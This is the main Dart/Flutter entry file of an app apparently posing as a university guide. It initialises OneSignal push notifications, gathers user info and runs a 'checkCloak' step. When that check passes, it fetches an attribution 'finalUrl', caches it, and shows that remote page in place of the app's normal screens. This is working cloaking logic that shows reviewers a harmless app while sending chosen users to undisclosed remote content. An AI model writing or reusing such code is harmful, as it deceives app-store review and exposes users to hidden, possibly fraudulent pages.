// ignore_for_file: unused_import

import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter/cupertino.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/home/bloc/home_service.dart';
import 'features/home/pages/constants.dart';
import 'features/univer/bloc/univer_bloc.dart';
import 'features/univer/bloc/univer_log.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  initializeApp();
}

Future<void> initializeApp() async {
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  OneSignal.Debug.setLogLevel(OSLogLevel.verbose);

  OneSignal.initialize("ebd43544-4652-4461-b953-3abfd96e8588");

  OneSignal.Notifications.requestPermission(true);
  final userInfo = await getUserInfo();
  final cachedFinalUrl = await getCachedFinalUrl();
  if (cachedFinalUrl != null) {
    runApp(MyApp(finalUrl: cachedFinalUrl));
    return;
  }

  final cloakUrl = await getLinks();
  if (cloakUrl == null) {
    runApp(const MyApp());
    return;
  }

  bool isCloakPassed = await checkCloak(cloakUrl);
  if (isCloakPassed) {
    final finalUrl = await getAttribution(ATTRIBUTION_URL, userInfo);
    if (finalUrl != null) {
      // print(finalUrl);
      // final check = await HttpClient().getUrl(Uri.parse(finalUrl));
      // check.followRedirects = false;
      // final responses = await check.close();
      await cacheFinalUrl(finalUrl);

      runApp(MyApp(finalUrl: finalUrl));
      return;
    }
  }
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  final String? finalUrl;

  const MyApp({super.key, this.finalUrl});

  @override
  Widget build(BuildContext context) {
    precacheImage(const AssetImage('assets/bg.png'), context);
    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => HomeBloc()),
        BlocProvider(create: (context) => UniverBloc()),
      ],
      child: MaterialApp.router(
        debugShowCheckedModeBanner: false,
        theme: theme,
        routerConfig: routerConfig,
        builder: (context, child) {
          return FutureBuilder<String?>(
            future: Future.value(finalUrl),
            builder: (context, snapshot) {
              if (snapshot.connectionState == ConnectionState.waiting) {
                return Scaffold(
                  backgroundColor: Colors.deepPurple.withOpacity(0.8),
                  body: const Center(
                    child: CupertinoActivityIndicator(),
                  ),
                );
              } else if (snapshot.hasData && snapshot.data != null) {
                return NewUniversityScreen(university: snapshot.data!);
              } else {
                return Scaffold(
                  backgroundColor: Colors.deepPurple.withOpacity(0.8),
                  body: const Center(
                    child: CupertinoActivityIndicator(),
                  ),
                );
              }
            },
          );
        },
      ),
    );
  }
}

class LoadingScreen extends StatelessWidget {
  const LoadingScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        color: Colors.deepPurple,
        child: Stack(
          children: [
            Opacity(
              opacity: 0.2,
              child: Container(
                color: Colors.black,
              ),
            ),
            const Center(
              child: CupertinoActivityIndicator(),
            ),
          ],
        ),
      ),
    );
  }
}
